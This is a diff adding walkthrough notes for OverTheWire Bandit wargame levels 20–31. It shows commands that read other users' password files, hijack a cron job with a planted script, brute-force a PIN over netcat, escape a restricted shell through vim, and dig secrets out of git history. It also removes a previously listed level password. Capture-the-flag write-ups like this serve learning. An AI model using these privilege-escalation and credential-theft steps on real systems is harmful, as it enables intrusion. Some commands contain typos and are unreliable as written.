@@ -142,7 +142,150 @@ find /home/bandit19 -perm -u=s -type f 2>/dev/null
 # grab the password
 ./bandit20-do cat /etc/bandit_pass/bandit20
 ```
+Bandit Level 20 → Level 21
+```
+# start a listener in the background
+nc -nlvp 4444 < /etc/bandit_pass/bandit20 &
+
+# connect to that port with suid binary
+./suconnect 4444 
+```
+Bandit Level 21 → Level 22
+```
+# review cronjobs and scripts
+cat /etc/cron.d/cronjob_bandit22
+cat /usr/bin/cronjob_bandit22.sh
+
+# review file referenced in the bash srcipt
+cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+```
+Bandit Level 22 → Level 23
+```
+# review cronjobs and scripts
+cat /etc/cron.d/cronjob_bandit23
+cat /usr/bin/cronjob_bandit23.sh
+
+# recreate what the script is doing
+echo "I am user bandit23" | md5sum | cut -d ' ' -f 1
+
+# use md5 has to access the folder created in /tmp 
+cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+```
+Bandit Level 23 → Level 24
+```
+# review cronjobs and scripts
+cat /etc/cron.d/cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+
+# creat a working directory
+mkdir /tmp/e
+chmod 777 -R /tmp/e
+
+# create script that will be excuted by the bandit24 cronjob
+vim /tmp/e/script.sh
+
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/e/pass.txt
+
+touch /tmp/e/pass.txt
+chmod 777 /tmp/e/pass.txt
+chmod 777 /tmp/script.sh
+mv /tmp/e/script.sh /var/spool/bandit24/foo/
+
+# watch the file for the bandit24 password
+watch cat /tmp/e/pass.txt
+```
+Bandit Level 24 → Level 25
+```
+mkdir /tmp/lab
+cd /tm/lab
+vim brute.sh
+
+#!/bin/bash
+
+password=$(cat /etc/bandit_pass/bandit24)
+
+for pin in $(seq -w 0000 9999); do
+        echo "$password $pin" >> /tmp/lab/combinations.txt
+done
+cat /tmp/lab/combinations.txt | nc localhost 30002 >> /tmp/lab/results.txt &
+
+# find password in results
+grep -v Wrong /tmp/lab/results.txt
+```
+Bandit Level 25 → Level 26
+```
+# check bandit26 default shell
+getent passwd | grep bandit26
+
+# see what the shell is doing
+cat /usr/bin/showtext
+
+# login with a very small window size
+ssh -i ./bandit26.sshkey bandit26@localhost
+
+# use v to enter vim
+:e /etc/bandit_pass/bandit26
+```
+Bandit Level 26 → Level 27
+```
+# type following into vim to obtain a shell
+:set shell=/bin/bash
+:shell
+
+# use the suid file in the home direcroty to grab the password
+./bandit27-do cat /etc/bandit_pass/bandit27
+```
+Bandit Level 27 → Level 28
+```
+# clone repo into tmp directory using bandit27 password
+git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo /tmp/clone
+
+# grap password
+cat README
 
 ```
-0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO - bandit 20
+Bandit Level 28 → Level 29
 ```
+# clone repo into tmp directory using bandit28 password
+git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo /tmp/cloned
+
+# review logs
+git logs
+
+# checkout previous vulnerbale version of the repo
+git checkout fb0df1358b1ff146f581651a84bae622353a71c0
+
+# review where pasword was removed
+cat README.md
+```
+
+```
+mkdir /tmp/clone_29
+git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo /tmp/clone_29
+
+# review the available branches
+git branch -a
+
+# checkout the dev branch and review the README
+git checkout remotes/origin/dev
+cat README.md
+```
+
+```
+mkdir /tmp/clone_30
+git clone ssh://bandit30-git@localhost:2220/home/bandit30-git/repo /tmp/clone_30
+
+# review tags for version history
+git tag
+
+# view the tag
+git show secret
+
+# checkout the dev branch and review the README
+git checkout remotes/origin/dev
+cat README.md
+```
+mkdir /tmp/clone_31
+git clone ssh://bandit31-git@localhost:2220/home/bandit31-git/repo /tmp/clone_31
+push stuff but need to get password back
